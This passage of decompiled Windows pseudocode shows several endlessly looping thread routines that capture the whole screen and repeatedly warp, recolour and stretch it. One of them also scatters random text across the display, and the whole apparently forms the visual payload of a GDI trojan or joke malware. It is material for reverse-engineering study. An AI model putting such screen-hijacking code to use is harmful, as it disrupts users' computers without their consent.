    BitBlt(v36, 0, 0, v54, cy, v34, 0, 0, 0xCC0020u);
    v37 = cy;
    v38 = v54;
    if ( v54 * cy > 0 )
    {
      v39 = 0LL;
      do
      {
        v39 += 3LL;
        v40 = v35;
        v41 = v35 % v38;
        ++v35;
        *((char *)v52 + v39 - 1) *= (unsigned __int8)v37 & (unsigned __int8)v41;
        *((char *)v52 + v39 - 3) *= (unsigned __int8)v41 & BYTE1(v54);
        *((char *)v52 + v39 - 2) -= (v40 / v37) & BYTE2(cy);
        *((char *)v52 + v39 - 1) -= v54 & BYTE1(v41);
        v37 = cy;
        v38 = v54;
      }
      while ( v35 < v54 * cy );
      v33 = v46;
    }
    BitBlt(v34, 0, 0, v38, v37, v36, 0, 0, 0xCC0020u);
    ReleaseDC(v33, v34);
    DeleteDC(v34);
    DeleteDC(v36);
    DeleteObject(hoa);
    DeleteObject(v33);
    DeleteObject(v52);
    DeleteObject(&v54);
    DeleteObject(&cy);
    DeleteObject(&v57);
    v1 = hdc;
    v5 = v42;
  }
}
// 14000A650: using guessed type float flt_14000A650[4096];
// 140001F50: using guessed type float var_180[4];

//----- (00000001400026E0) ----------------------------------------------------
void __fastcall __noreturn sub_1400026E0(LPVOID lpThreadParameter)
{
  HDC v1; // rdi
  HDC v2; // rsi
  __int64 SystemMetrics; // r15
  int v4; // r14d
  int v5; // ebx
  double v6; // xmm8_8
  HBITMAP v7; // rax
  int v8; // r13d
  int v9; // r12d
  float v10; // xmm13_4
  __int64 v11; // rcx
  __int64 v12; // rax
  int v13; // edi
  float v14; // xmm7_4
  __int64 v15; // rsi
  int v16; // r14d
  int v17; // r13d
  int v18; // edx
  float *v19; // rax
  int v20; // ebx
  __int64 v21; // xmm6_8
  double v22; // xmm0_8
  float v23; // xmm1_4
  int v24; // eax
  int x1; // edi
  double v26; // xmm0_8
  int v27; // ebx
  int y1; // ebx
  HDC v29; // rbx
  HDC v30; // rsi
  int v31; // r13d
  int v32; // eax
  int hSrc; // r12d
  HBITMAP v34; // rax
  HDC v35; // rdi
  __int64 v36; // r10
  int v37; // r11d
  __m128i si128; // xmm4
  __m128i v39; // xmm5
  __int64 v40; // rbx
  __m128i v41; // xmm6
  __m128i v42; // xmm7
  __m128i v43; // xmm3
  __m128i v44; // xmm1
  __m128i v45; // xmm3
  __m128i v46; // xmm3
  __m128i v47; // xmm3
  __m128i v48; // xmm3
  __m128i v49; // xmm1
  __m128i v50; // xmm3
  __m128i v51; // xmm3
  __m128i v52; // xmm3
  HDC v53; // r14
  HDC v54; // rsi
  HBITMAP CompatibleBitmap; // rax
  int v56; // [rsp+68h] [rbp-A0h]
  int v57; // [rsp+6Ch] [rbp-9Ch]
  __int64 v58; // [rsp+70h] [rbp-98h]
  HDC CompatibleDC; // [rsp+78h] [rbp-90h]
  HDC DC; // [rsp+80h] [rbp-88h]
  __int64 v61; // [rsp+98h] [rbp-70h] BYREF
  int v62; // [rsp+A0h] [rbp-68h]
  float v63[4]; // [rsp+B8h] [rbp-50h] BYREF
  void *v64; // [rsp+C8h] [rbp-40h] BYREF
  void *ppvBits; // [rsp+D0h] [rbp-38h] BYREF
  BITMAPINFO pbmi; // [rsp+D8h] [rbp-30h] BYREF
  BITMAPINFO v67; // [rsp+108h] [rbp+0h] BYREF

  DC = GetDC(0LL);
  v1 = DC;
  CompatibleDC = CreateCompatibleDC(DC);
  v2 = CompatibleDC;
  SystemMetrics = GetSystemMetrics(0);
  pbmi.bmiHeader.biSize = 44;
  v4 = GetSystemMetrics(1);
  v57 = v4;
  pbmi.bmiHeader.biHeight = v4;
  v5 = 0;
  pbmi.bmiHeader.biWidth = SystemMetrics;
  v56 = 0;
  *(_QWORD *)&pbmi.bmiHeader.biPlanes = 2097153LL;
  ppvBits = 0LL;
  memset(&pbmi.bmiHeader.biSizeImage, 0, 24);
  v6 = 0.0;
  v7 = CreateDIBSection(DC, &pbmi, 0, &ppvBits, 0LL, 0);
  SelectObject(CompatibleDC, v7);
  while ( 1 )
  {
    v8 = SystemMetrics + 10;
    BitBlt(v2, 0, 0, SystemMetrics, v4, v1, 0, 0, 0xCC0020u);
    v9 = 0;
    v10 = (float)v5 / 10.0;
    if ( v4 > 0 )
    {
      v11 = 0LL;
      v12 = 4 * SystemMetrics;
      v58 = 0LL;
      do
      {
        v13 = 0;
        v14 = (float)v9;
        if ( (int)SystemMetrics > 0 )
        {
          v15 = v11;
          v16 = SystemMetrics * (v9 % (unsigned int)v4);
          v17 = (int)(float)(flt_14000A650[(int)(float)((float)((float)((float)((float)(v14 / 25.0) + v10) + 1.570796)
                                                              / 6.2831841)
                                                      * 4096.0) & 0xFFF]
                           * 16.0);
          do
          {
            v18 = *((_DWORD *)ppvBits + v16 + (v13 + v17) % (unsigned int)SystemMetrics);
            *((_BYTE *)ppvBits + v15 + 2) = (int)(float)((float)((float)(unsigned __int8)v18 * 0.875)
                                                       + (float)((float)*((unsigned __int8 *)ppvBits + v15) * 0.125));
            v19 = sub_140001000(v63, v18);
            v20 = *((_DWORD *)v19 + 2);
            v21 = *(_QWORD *)v19;
            v22 = fmod((float)((float)v13 + v14) + COERCE_FLOAT(*(_QWORD *)v19) + 0.02222222222222222, 1.0);
            v62 = v20;
            v23 = v22;
            *(float *)&v21 = v23;
            v61 = v21;
            v24 = sub_1400011F0((float *)&v61);
            ++v13;
            *(_DWORD *)((char *)ppvBits + v15) = v24;
            v15 += 4LL;
          }
          while ( v13 < (int)SystemMetrics );
          v11 = v58;
          v4 = v57;
          v12 = 4 * SystemMetrics;
        }
        v11 += v12;
        ++v9;
        v58 = v11;
      }
      while ( v9 < v4 );
      v8 = SystemMetrics + 10;
      v2 = CompatibleDC;
    }
    for ( x1 = 0; x1 < v8; ++x1 )
    {
      v26 = cos(v6 / 60.0);
      v27 = (int)(sin(v26 * 20.0 * 3.141592025756836 + v6 * 32.0 / 100.0) * 10.0);
      y1 = v27 - (int)(cos(v6) * -80.0 * 3.141592025756836);
      BitBlt(v2, x1, 0, 1, v4, v2, x1, y1, 0x1100A6u);
      BitBlt(v2, 0, x1, SystemMetrics, 1, v2, y1, x1, 0xCC0020u);
      v6 = v6 + 0.009999999776482582;
    }
    ++v56;
    BitBlt(DC, 0, 0, SystemMetrics, v4, v2, 0, 0, 0xCC0020u);
    v29 = GetDC(0LL);
    v30 = CreateCompatibleDC(v29);
    v31 = GetSystemMetrics(0);
    v32 = GetSystemMetrics(1);
    v67.bmiHeader.biSize = 44;
    memset(&v67.bmiHeader.biCompression, 0, 28);
    hSrc = v32;
    *(_DWORD *)&v67.bmiHeader.biPlanes = 2097153;
    v67.bmiHeader.biWidth = v31;
    v64 = 0LL;
    v67.bmiHeader.biHeight = v32;
    v34 = CreateDIBSection(v29, &v67, 0, &v64, 0LL, 0);
    SelectObject(v30, v34);
    v35 = GetDC(0LL);
    BitBlt(v30, 0, 0, v31, hSrc, v35, 0, 0, 0xCC0020u);
    v36 = 0LL;
    v37 = v31 * hSrc;
    if ( v31 * hSrc > 0 && (unsigned int)v37 >= 8 && dword_14000A018 >= 2 )
    {
      si128 = _mm_load_si128((const __m128i *)&xmmword_140008560);
      v39 = _mm_load_si128((const __m128i *)&xmmword_140008570);
      v40 = 8LL;
      v41 = _mm_cvtsi32_si128(1u);
      v42 = _mm_cvtsi32_si128(0x17u);
      do
      {
        v43 = _mm_unpacklo_epi64(
                _mm_unpacklo_epi32(
                  _mm_cvtsi32_si128(2 * *(_DWORD *)((char *)v64 + v40 - 8)),
                  _mm_cvtsi32_si128(2 * *(_DWORD *)((char *)v64 + v40 - 4))),
                _mm_unpacklo_epi32(
                  _mm_cvtsi32_si128(2 * *(_DWORD *)((char *)v64 + v40)),
                  _mm_cvtsi32_si128(2 * *(_DWORD *)((char *)v64 + v40 + 4))));
        v44 = (__m128i)_mm_shuffle_ps(
                         (__m128)_mm_mul_epu32(_mm_unpacklo_epi32(v43, v43), si128),
                         (__m128)_mm_mul_epu32(_mm_unpackhi_epi32(v43, v43), si128),
                         221);
        v45 = _mm_sub_epi32(
                v43,
                _mm_mullo_epi32(
                  _mm_srl_epi32(_mm_add_epi32(_mm_srl_epi32(_mm_sub_epi32(v43, v44), v41), v44), v42),
                  v39));
        *(_DWORD *)((char *)v64 + v40 - 8) = _mm_cvtsi128_si32(v45);
        v46 = _mm_srli_si128(v45, 4);
        *(_DWORD *)((char *)v64 + v40 - 4) = _mm_cvtsi128_si32(v46);
        v47 = _mm_srli_si128(v46, 4);
        *(_DWORD *)((char *)v64 + v40) = _mm_cvtsi128_si32(v47);
        *(_DWORD *)((char *)v64 + v40 + 4) = _mm_cvtsi128_si32(_mm_srli_si128(v47, 4));
        v36 += 8LL;
        v48 = _mm_unpacklo_epi64(
                _mm_unpacklo_epi32(
                  _mm_cvtsi32_si128(2 * *(_DWORD *)((char *)v64 + v40 + 8)),
                  _mm_cvtsi32_si128(2 * *(_DWORD *)((char *)v64 + v40 + 12))),
                _mm_unpacklo_epi32(
                  _mm_cvtsi32_si128(2 * *(_DWORD *)((char *)v64 + v40 + 16)),
                  _mm_cvtsi32_si128(2 * *(_DWORD *)((char *)v64 + v40 + 20))));
        v49 = (__m128i)_mm_shuffle_ps(
                         (__m128)_mm_mul_epu32(_mm_unpacklo_epi32(v48, v48), si128),
                         (__m128)_mm_mul_epu32(_mm_unpackhi_epi32(v48, v48), si128),
                         221);
        v50 = _mm_sub_epi32(
                v48,
                _mm_mullo_epi32(
                  _mm_srl_epi32(_mm_add_epi32(_mm_srl_epi32(_mm_sub_epi32(v48, v49), v41), v49), v42),
                  v39));
        *(_DWORD *)((char *)v64 + v40 + 8) = _mm_cvtsi128_si32(v50);
        v51 = _mm_srli_si128(v50, 4);
        *(_DWORD *)((char *)v64 + v40 + 12) = _mm_cvtsi128_si32(v51);
        v52 = _mm_srli_si128(v51, 4);
        *(_DWORD *)((char *)v64 + v40 + 16) = _mm_cvtsi128_si32(v52);
        *(_DWORD *)((char *)v64 + v40 + 20) = _mm_cvtsi128_si32(_mm_srli_si128(v52, 4));
        v40 += 32LL;
      }
      while ( v36 < v37 - v37 % 8 );
    }
    for ( ; v36 < v37; ++v36 )
      *((_DWORD *)v64 + v36) = 2 * *((_DWORD *)v64 + v36) % 0xFFFFFFu;
    BitBlt(v35, 0, 0, v31, hSrc, v30, 0, 0, 0xCC0020u);
    BitBlt(v35, 0, 0, v31, hSrc, v30, 0, -hSrc, 0xCC0020u);
    ReleaseDC(0LL, v35);
    DeleteDC(v35);
    v53 = GetDC(0LL);
    v54 = CreateCompatibleDC(v53);
    CompatibleBitmap = CreateCompatibleBitmap(v53, v31, hSrc);
    SelectObject(v54, CompatibleBitmap);
    SetStretchBltMode(v54, 3);
    SetStretchBltMode(v53, 3);
    StretchBlt(v54, 0, 0, v31 / 2, hSrc / 2, v53, 0, 0, v31, hSrc, 0xCC0020u);
    StretchBlt(v53, 0, 0, v31, hSrc, v54, 0, 0, v31 / 2, hSrc / 2, 0xCC0020u);
    v2 = CompatibleDC;
    v4 = v57;
    v5 = v56;
    v1 = DC;
  }
}
// 140008560: using guessed type __int128 xmmword_140008560;
// 140008570: using guessed type __int128 xmmword_140008570;
// 14000A018: using guessed type int dword_14000A018;
// 14000A650: using guessed type float flt_14000A650[4096];
// 1400026E0: using guessed type float var_150[4];

//----- (0000000140002F30) ----------------------------------------------------
void __fastcall __noreturn sub_140002F30(LPVOID lpThreadParameter)
{
  HDC DC; // rax
  int wSrc; // ebp
  int hSrc; // r14d
  HDC v4; // r15
  HDC CompatibleDC; // r12
  HBITMAP v6; // rax
  int v7; // esi
  int v8; // edi
  HDC v9; // rbx
  int v10; // ebx
  int v11; // esi
  __int64 v12; // r13
  int v13; // r12d
  __int64 v14; // r15
  float v15; // xmm1_4
  __int64 v16; // rbp
  double v17; // xmm9_8
  double v18; // xmm12_8
  float v19; // xmm10_4
  char *v20; // rdi
  float *v21; // rax
  int v22; // ebx
  __int64 v23; // xmm8_8
  double v24; // xmm0_8
  double v25; // xmm6_8
  double v26; // xmm0_8
  double v27; // xmm0_8
  float v28; // xmm1_4
  int v29; // [rsp+60h] [rbp-158h]
  int SystemMetrics; // [rsp+64h] [rbp-154h]
  HDC v31; // [rsp+78h] [rbp-140h]
  HDC v32; // [rsp+80h] [rbp-138h]
  __int64 v33; // [rsp+90h] [rbp-128h] BYREF
  int v34; // [rsp+98h] [rbp-120h]
  float v35[4]; // [rsp+A0h] [rbp-118h] BYREF
  void *ppvBits; // [rsp+B0h] [rbp-108h] BYREF
  BITMAPINFO pbmi; // [rsp+B8h] [rbp-100h] BYREF

  DC = GetDC(0LL);
  CreateCompatibleDC(DC);
  SystemMetrics = GetSystemMetrics(0);
  wSrc = SystemMetrics;
  hSrc = GetSystemMetrics(1);
  v31 = GetDC(0LL);
  v4 = v31;
  pbmi.bmiHeader.biSize = 44;
  CompatibleDC = CreateCompatibleDC(v31);
  v32 = CompatibleDC;
  pbmi.bmiHeader.biWidth = SystemMetrics;
  pbmi.bmiHeader.biHeight = hSrc;
  memset(&pbmi.bmiHeader.biSizeImage, 0, 24);
  *(_QWORD *)&pbmi.bmiHeader.biPlanes = 2097153LL;
  ppvBits = 0LL;
  v6 = CreateDIBSection(v31, &pbmi, 0, &ppvBits, 0LL, 0);
  SelectObject(CompatibleDC, v6);
  v7 = GetSystemMetrics(0);
  v8 = GetSystemMetrics(1);
  GetDC(0LL);
  v9 = GetDC(0LL);
  CreateCompatibleDC(v9);
  CreateCompatibleDC(v9);
  CreateCompatibleBitmap(v9, v7, v8);
  v10 = 0;
  v29 = 0;
  while ( 1 )
  {
    StretchBlt(CompatibleDC, 0, 0, wSrc, hSrc, v4, 0, 0, wSrc, hSrc, 0xCC0020u);
    v11 = 0;
    if ( wSrc > 0 )
    {
      v12 = 0LL;
      do
      {
        v13 = 0;
        if ( hSrc > 0 )
        {
          v14 = 4LL * wSrc;
          v15 = (float)wSrc;
          v16 = v12;
          v17 = sin((double)v11 / 570.0) * 110.0 + 310.0;
          v18 = (double)v10;
          v19 = (float)((float)hSrc + v15) * 64.0;
          do
          {
            v20 = (char *)ppvBits;
            v21 = sub_140001000(v35, *(_DWORD *)((char *)ppvBits + v16));
            v22 = *((_DWORD *)v21 + 2);
            v23 = *(_QWORD *)v21;
            v24 = cos((double)v13 / 740.0);
            v25 = sin((double)v11 / (v24 * 150.0 + 370.0)) * v18;
            v26 = cos((double)v13 / v17);
            v27 = fmod(
                    (float)((float)((float)(int)(v25 * v26 + v18) / 300.0)
                          + (float)((float)((float)v13 + (float)v11) / v19)),
                    1.0);
            v34 = v22;
            v28 = v27;
            *(float *)&v23 = v28;
            v33 = v23;
            *(_DWORD *)&v20[v16] = sub_1400011F0((float *)&v33);
            ++v13;
            v16 += v14;
          }
          while ( v13 < hSrc );
          wSrc = SystemMetrics;
          v10 = v29;
        }
        ++v11;
        v12 += 4LL;
      }
      while ( v11 < wSrc );
      v4 = v31;
      CompatibleDC = v32;
    }
    v10 += 4;
    v29 = v10;
    StretchBlt(v4, 0, 0, wSrc, hSrc, CompatibleDC, 0, 0, wSrc, hSrc, 0x660046u);
  }
}
// 140002F30: using guessed type float var_118[4];

//----- (0000000140003300) ----------------------------------------------------
void __fastcall __noreturn sub_140003300(LPVOID lpThreadParameter)
{
  double v1; // xmm8_8
  HDC v2; // r14
  __int64 SystemMetrics; // r15
  int v4; // r12d
  HDC v5; // r13
  HBITMAP CompatibleBitmap; // rax
  HBITMAP v7; // rbx
  int v8; // esi
  int v9; // edi
  HDC DC; // rbx
  int v11; // esi
  HDC v12; // rax
  int v13; // r14d
  int v14; // esi
  __int64 v15; // rdi
  int v16; // edx
  float *v17; // rax
  __int64 v18; // xmm6_8
  int v19; // ebx
  double v20; // xmm0_8
  float v21; // xmm1_4
  int v22; // eax
  int x1; // edi
  double v24; // xmm0_8
  int v25; // ebx
  double v26; // xmm0_8
  int y1; // edi
  double v28; // xmm0_8
  int v29; // ebx
  double v30; // xmm0_8
  unsigned __int64 v31; // rdx
  unsigned __int64 v32; // rcx
  unsigned __int64 v33; // rdx
  HDC v34; // rbx
  int v35; // edi
  int v36; // eax
  int v37; // r14d
  HBITMAP v38; // rax
  HDC v39; // rbx
  int v40; // r8d
  __int64 v41; // r9
  HDC v42; // [rsp+58h] [rbp-B0h]
  HDC hdc; // [rsp+68h] [rbp-A0h]
  HDC CompatibleDC; // [rsp+70h] [rbp-98h]
  __int64 v45; // [rsp+78h] [rbp-90h] BYREF
  int v46; // [rsp+80h] [rbp-88h]
  float v47[4]; // [rsp+88h] [rbp-80h] BYREF
  void *ppvBits; // [rsp+98h] [rbp-70h] BYREF
  void *v49; // [rsp+A0h] [rbp-68h] BYREF
  BITMAPINFO pbmi; // [rsp+A8h] [rbp-60h] BYREF
  BITMAPINFO v51; // [rsp+D8h] [rbp-30h] BYREF

  v1 = 0.0;
  hdc = GetDC(0LL);
  v2 = hdc;
  SystemMetrics = GetSystemMetrics(0);
  v4 = GetSystemMetrics(1);
  CompatibleDC = CreateCompatibleDC(hdc);
  v5 = CompatibleDC;
  CompatibleBitmap = CreateCompatibleBitmap(hdc, SystemMetrics, v4);
  SelectObject(CompatibleDC, CompatibleBitmap);
  pbmi.bmiHeader.biSize = 44;
  ppvBits = 0LL;
  pbmi.bmiHeader.biWidth = SystemMetrics;
  pbmi.bmiHeader.biHeight = v4;
  *(_QWORD *)&pbmi.bmiHeader.biPlanes = 2097153LL;
  memset(&pbmi.bmiHeader.biSizeImage, 0, 24);
  v7 = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0LL, 0);
  SelectObject(CompatibleDC, v7);
  SelectObject(CompatibleDC, v7);
  v8 = GetSystemMetrics(0);
  v9 = GetSystemMetrics(1);
  GetDC(0LL);
  DC = GetDC(0LL);
  CreateCompatibleDC(DC);
  CreateCompatibleDC(DC);
  CreateCompatibleBitmap(DC, v8, v9);
  v11 = SystemMetrics + 10;
  while ( 1 )
  {
    v12 = GetDC(0LL);
    ReleaseDC(0LL, v12);
    BitBlt(v5, 0, 0, SystemMetrics, v4, v2, 0, 0, 0xCC0020u);
    v13 = 0;
    if ( (int)SystemMetrics > 0 )
    {
      do
      {
        v14 = 0;
        if ( v4 > 0 )
        {
          v15 = 4LL * (unsigned int)v13;
          do
          {
            v16 = *((_DWORD *)ppvBits
                  + (_DWORD)SystemMetrics * (v14 % (unsigned int)v4)
                  + (v13
                   - (int)(float)(flt_14000A650[(int)(float)((float)((float)((float)((float)((float)v14 / 25.0) + 0.0)
                                                                           + 1.570796)
                                                                   / 6.2831841)
                                                           * 4096.0) & 0xFFF]
                                * -16.0))
                  % (unsigned int)SystemMetrics);
            *((_BYTE *)ppvBits + v15 + 2) = (int)(float)((float)((float)*((unsigned __int8 *)ppvBits + v15) * 0.125)
                                                       + (float)((float)(unsigned __int8)v16 * 0.875));
            v17 = sub_140001000(v47, v16);
            v18 = *(_QWORD *)v17;
            v19 = *((_DWORD *)v17 + 2);
            v20 = fmod(
                    (float)((float)((float)v13 + (float)v14)
                          / (float)((float)((float)v4 + (float)(int)SystemMetrics) * 10.0))
                  + COERCE_FLOAT(*(_QWORD *)v17)
                  + 0.06666666666666667,
                    1.0);
            v46 = v19;
            v21 = v20;
            *(float *)&v18 = v21;
            v45 = v18;
            v22 = sub_1400011F0((float *)&v45);
            ++v14;
            *(_DWORD *)((char *)ppvBits + v15) = v22;
            v15 += 4 * SystemMetrics;
          }
          while ( v14 < v4 );
        }
        ++v13;
      }
      while ( v13 < (int)SystemMetrics );
      v11 = SystemMetrics + 10;
      v5 = CompatibleDC;
    }
    x1 = 0;
    if ( v11 > 0 )
    {
      do
      {
        v24 = cos(v1 / 5.0);
        v25 = (int)sin(v24 * 5.0 * 3.141592025756836 + v1);
        v26 = cos(v1);
        BitBlt(v5, x1, 0, 1, v4, v5, x1, v25 - (int)(v26 * -2.0 * 3.141592025756836), 0xCC0020u);
        ++x1;
        v1 = v1 + 0.02999999932944775;
      }
      while ( x1 < v11 );
      for ( y1 = 0; y1 < v11; ++y1 )
      {
        v28 = cos(v1 / 50.0);
        v29 = (int)sin(v28 * 50.0 * 3.141592025756836 + v1);
        v30 = cos(v1);
        BitBlt(v5, 0, y1, SystemMetrics, 1, v5, v29 - (int)(v30 * -30.0 * 3.141592025756836), y1, 0xCC0020u);
        v1 = v1 + 0.009999999776482582;
      }
    }
    BitBlt(hdc, 0, 0, SystemMetrics, v4, v5, 0, 0, 0xCC0020u);
    v31 = (0xF3E05CA5C43E376BuLL
         * (qword_14000A640 ^ 0x8EBF635BEE3C6D25uLL ^ (((qword_14000A640 ^ 0x8EBF635BEE3C6D25uLL) >> 26) | (32 * (qword_14000A640 ^ 0x8EBF635BEE3C6D25uLL))))) ^ 0x8EBF635BEE3C6D25uLL;
    v32 = (0xF3E05CA5C43E376BuLL * (v31 ^ ((v31 >> 26) | (32 * v31)))) ^ 0x8EBF635BEE3C6D25uLL;
    v33 = (0xF3E05CA5C43E376BuLL * (v32 ^ ((v32 >> 26) | (32 * v32)))) ^ 0x8EBF635BEE3C6D25uLL;
    qword_14000A648 = 0xF3E05CA5C43E376BuLL * (v33 ^ ((v33 >> 26) | (32 * v33)));
    qword_14000A640 = qword_14000A648;
    v34 = GetDC(0LL);
    v42 = CreateCompatibleDC(v34);
    v35 = GetSystemMetrics(0);
    v36 = GetSystemMetrics(1);
    v51.bmiHeader.biSize = 44;
    memset(&v51.bmiHeader.biCompression, 0, 28);
    v37 = v36;
    *(_DWORD *)&v51.bmiHeader.biPlanes = 2097153;
    v51.bmiHeader.biWidth = v35;
    v49 = 0LL;
    v51.bmiHeader.biHeight = v36;
    v38 = CreateDIBSection(v34, &v51, 0, &v49, 0LL, 0);
    SelectObject(v42, v38);
    v39 = GetDC(0LL);
    BitBlt(v42, 0, 0, v35, v37, v39, 0, 0, 0xCC0020u);
    v40 = 0;
    if ( v35 * v37 > 0 )
    {
      v41 = 0LL;
      do
      {
        if ( v40 / v35 )
          *(_DWORD *)((char *)v49 + v41) += v40 / (v40 / v35);
        ++v40;
        v41 += 4LL;
      }
      while ( v40 < v35 * v37 );
    }
    BitBlt(v39, 0, 0, v35, v37, v42, 0, 0, 0xCC0020u);
    ReleaseDC(0LL, v39);
    DeleteDC(v39);
    v2 = hdc;
  }
}
// 14000A640: using guessed type __int64 qword_14000A640;
// 14000A648: using guessed type __int64 qword_14000A648;
// 14000A650: using guessed type float flt_14000A650[4096];
// 140003300: using guessed type float var_150[4];

//----- (00000001400039E0) ----------------------------------------------------
void __fastcall __noreturn sub_1400039E0(LPVOID lpThreadParameter)
{
  HDC v1; // rdi
  int v2; // r14d
  int v3; // r15d
  int v4; // r13d
  LONG v5; // r12d
  char *v6; // rsi
  void *v7; // rbx
  HFONT FontW; // rax
  int v9; // r12d
  int v10; // ebx
  int v11; // edi
  int v12; // eax
  double v13; // xmm6_8
  double v14; // xmm7_8
  __m128i v15; // xmm5
  __int64 v16; // rax
  double v17; // xmm5_8
  int v18; // ecx
  int v19; // ebx
  int *v20; // r10
  float v21; // xmm0_4
  double v22; // xmm1_8
  float v23; // xmm0_4
  float v24; // xmm2_4
  int v25; // r9d
  double v26; // xmm1_8
  float v27; // xmm0_4
  float v28; // xmm3_4
  float v29; // xmm4_4
  int i; // r8d
  int j; // edx
  int v32; // edx
  unsigned int v33; // ebx
  const WCHAR *v34; // rsi
  int v35; // eax
  unsigned int v36; // r11d
  int v37; // r9d
  int v38; // r10d
  unsigned int v39; // edx
  unsigned int v40; // ecx
  int v41; // edi
  int v42; // ebx
  int v43; // eax
  double v44; // xmm9_8
  __int64 v45; // r13
  int v46; // r12d
  HBITMAP CompatibleBitmap; // rax
  int v48; // esi
  int v49; // edi
  HDC v50; // rbx
  HDC v51; // rsi
  int v52; // r15d
  int v53; // esi
  __int64 v54; // rdi
  int v55; // edx
  float *v56; // rax
  __int64 v57; // xmm6_8
  int v58; // ebx
  double v59; // xmm0_8
  float v60; // xmm1_4
  int v61; // eax
  int x1; // edi
  double v63; // xmm6_8
  double v64; // xmm0_8
  int y1; // ebx
  HDC v66; // rax
  HDC v67; // rdi
  HDC v68; // rbx
  int v69; // r9d
  __int64 v70; // r8
  int v71; // eax
  int v72; // [rsp+78h] [rbp-90h]
  int v73; // [rsp+7Ch] [rbp-8Ch]
  DWORD v74; // [rsp+80h] [rbp-88h]
  int *v75; // [rsp+88h] [rbp-80h]
  int v76; // [rsp+88h] [rbp-80h]
  HDC DC; // [rsp+90h] [rbp-78h]
  int cy; // [rsp+98h] [rbp-70h]
  int SystemMetrics; // [rsp+9Ch] [rbp-6Ch]
  HDC hdcSrc; // [rsp+B0h] [rbp-58h]
  char *v81; // [rsp+B8h] [rbp-50h]
  HBITMAP hbit; // [rsp+C0h] [rbp-48h]
  HDC hdc; // [rsp+C8h] [rbp-40h]
  HDC CompatibleDC; // [rsp+D0h] [rbp-38h]
  LPVOID v85; // [rsp+D8h] [rbp-30h]
  unsigned int v86; // [rsp+E0h] [rbp-28h]
  HBITMAP h; // [rsp+E8h] [rbp-20h]
  __int64 v88; // [rsp+F8h] [rbp-10h] BYREF
  int v89; // [rsp+100h] [rbp-8h]
  float v90[4]; // [rsp+108h] [rbp+0h] BYREF
  LPCWSTR lpString[14]; // [rsp+118h] [rbp+10h]
  void *ppvBits; // [rsp+188h] [rbp+80h] BYREF
  void *v93; // [rsp+190h] [rbp+88h] BYREF
  BITMAPINFO pbmi; // [rsp+198h] [rbp+90h] BYREF
  BITMAPINFO v95; // [rsp+1C8h] [rbp+C0h] BYREF
  struct tagSIZE sz; // [rsp+1F8h] [rbp+F0h] BYREF

  v86 = __rdtsc();
  hdcSrc = GetDC(0LL);
  v1 = hdcSrc;
  SystemMetrics = GetSystemMetrics(0);
  cy = GetSystemMetrics(1);
  v72 = GetSystemMetrics(0);
  v2 = v72;
  v73 = GetSystemMetrics(1);
  v3 = v73;
  hdc = CreateCompatibleDC(hdcSrc);
  hbit = CreateCompatibleBitmap(hdcSrc, SystemMetrics, cy);
  SelectObject(hdc, hbit);
  v4 = 0;
  BitBlt(hdc, 0, 0, SystemMetrics, cy, hdcSrc, 0, 0, 0xCC0020u);
  GetProcessHeap();
  v5 = 4 * SystemMetrics * v73;
  v74 = v5;
  v81 = (char *)VirtualAlloc(0LL, v5, 0x3000u, 4u);
  v6 = v81;
  v85 = VirtualAlloc(0LL, v5, 0x3000u, 4u);
  v7 = v85;
  FontW = CreateFontW(48, 0, 0, 0, 0, 0, 0, 0, 1u, 8u, 0, 5u, 2u, L"Verdana");
  SelectObject(hdcSrc, FontW);
  SetBkMode(hdcSrc, 1);
  while ( 1 )
  {
    BitBlt(hdc, 0, 0, v2, v3, v1, 0, 0, 0xCC0090u);
    GetBitmapBits(hbit, v5, v7);
    v9 = 0;
    if ( v3 > 0 )
    {
      v10 = rand() & 0xFFF;
      v11 = 0;
      v12 = rand() & 0xFFF;
      v75 = (int *)v81;
      v13 = (double)(v12 + v10);
      v14 = (double)(2 * v12);
      v15 = _mm_cvtsi32_si128(2 * (rand() & 0xFFFu));
      v16 = 4LL * v2;
      *(_QWORD *)&v17 = *(_OWORD *)&_mm_cvtepi32_pd(v15);
      do
      {
        v18 = 0;
        v19 = 0;
        if ( v2 > 0 )
        {
          v20 = v75;
          v21 = COERCE_DOUBLE(*(_QWORD *)&v13 & 0x7FFFFFFFFFFFFFFFLL);
          v22 = v21 + 0.64999998;
          v23 = COERCE_DOUBLE(*(_QWORD *)&v14 & 0x7FFFFFFFFFFFFFFFLL);
          v24 = v22;
          v25 = (v11 + v4) % 5 - 20;
          v26 = v23 + 0.64999998;
          v27 = fabs(v17);
          do
          {
            for ( i = v25 % v2; i < 0; i += v2 )
              ;
            for ( j = ((v4 + v18) % 3 + v9 - 1) % v3; j < 0; j += v3 )
              ;
            ++v25;
            v32 = *((_DWORD *)v85 + (unsigned int)i + (__int64)(v2 * j));
            v18 = v19 + 1;
            v29 = v27 + 0.64999998;
            v28 = v26;
            *v20 = (unsigned __int8)(int)(float)((float)(unsigned __int8)v32 * v29) | (((unsigned __int8)(int)(float)((float)v32 * v28) | ((unsigned __int8)(int)(float)((float)v32 * v24) << 9)) << 9);
            v19 = v18;
            ++v20;
          }
          while ( v18 < v2 );
          v6 = (char *)v75;
          v11 = v9;
          v16 = 4LL * v2;
        }
        ++v11;
        v6 += v16;
        v75 = (int *)v6;
        v9 = v11;
      }
      while ( v11 < v3 );
      v1 = hdcSrc;
      v6 = v81;
    }
    SetBitmapBits(hbit, v74, v6);
    BitBlt(v1, 0, 0, v2, v3, hdc, 0, 0, 0xCC0020u);
    if ( (v4 & 1) != 0 )
    {
      v33 = (v86 << 13) ^ ((v86 & 0x7FFF0 ^ (v86 >> 13)) >> 4) ^ (32
                                                                * (v86 ^ (v86 << 13) ^ ((v86 & 0x7FFF0 ^ (v86 >> 13)) >> 4)));
      v34 = lpString[rand() % 13];
      v35 = lstrlenW(v34);
      GetTextExtentPointW(v1, v34, v35, &sz);
      v36 = v33 ^ (v33 << 13);
      v37 = v33 ^ (v33 << 13) ^ (v36 >> 17);
      v38 = v37 << 18;
      v37 *= 32;
      v39 = (v36 & 0xFFFE000F ^ ((v33 & 0x3F) << 13) ^ (v33 ^ v37) & 0x7FFF0 ^ ((v37 ^ (v36 >> 4)) >> 13)) >> 4;
      v40 = v33 ^ v37 ^ v39 ^ v38 ^ (v36 << 13) ^ (32 * (v33 ^ v37 ^ v39 ^ v38 ^ (v33 << 13) ^ (v36 << 13)));
      SetTextColor(v1, v40 ^ (32 * (v40 ^ (v40 >> 17))) ^ ((v40 & 0x7FFF0 ^ (v40 >> 13)) >> 4));
      v41 = lstrlenW(v34);
      v42 = rand() % cy;
      v43 = rand();
